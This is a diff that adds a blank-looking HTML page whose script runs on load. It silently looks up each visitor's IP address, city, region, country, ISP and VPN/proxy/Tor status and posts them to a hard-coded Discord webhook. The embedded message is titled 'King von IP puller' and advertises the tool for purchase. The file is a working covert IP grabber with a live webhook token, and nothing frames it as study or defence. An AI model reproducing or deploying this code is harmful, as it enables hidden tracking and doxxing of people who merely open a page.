@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <script>
+    async function sendToDiscord(ipInfo) {
+        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+        const discordMessage = {
+            content: "@everyone" ,
+            embeds: [
+                {
+                    image: {
+                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                    },
+                    title: "King von IP puller 😈",
+                    fields: [
+                        {
+                            name: "IP Address", 
+                            value: ipInfo.data.ip, 
+                            inline: true
+                        },
+                        {
+                            name: "City", 
+                            value: ipInfo.data.city, 
+                            inline: true
+                        },
+                        {
+                            name: "State", 
+                            value: ipInfo.data.region || "N/A", 
+                            inline: true
+                        },
+                        {
+                            name: "Country", 
+                            value: ipInfo.data.country, 
+                            inline: true
+                        },
+                        {
+                            name: "Organization", 
+                            value: ipInfo.data.org, 
+                            inline: true
+                        },
+                        {
+                            name: "ASN Name", 
+                            value: ipInfo.data.asn.name, 
+                            inline: true
+                        },
+                        {
+                            name: "VPN", 
+                            value: ipInfo.data.privacy.vpn ? "True" : "False", 
+                            inline: true
+                        },
+                        {
+                            name: "Proxy", 
+                            value: ipInfo.data.privacy.proxy ? "True" : "False", 
+                            inline: true
+                        },
+                        {
+                            name: "TOR", 
+                            value: ipInfo.data.privacy.tor ? "True" : "False", 
+                            inline: true
+                        },
+                    ],
+                    color: 0x007BFF,
+                    footer: {
+                        text: "BY RUNTZ PURCHASE TODAY!"
+                    }
+                }
+            ]
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(discordMessage)
+        });
+    }
+
+    async function getVisitorInfo() {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
+        const ipInfo = await ipInfoResponse.json();
+
+        await sendToDiscord(ipInfo);
+    }
+
+    getVisitorInfo();
+    </script>
+</body>
+</html>
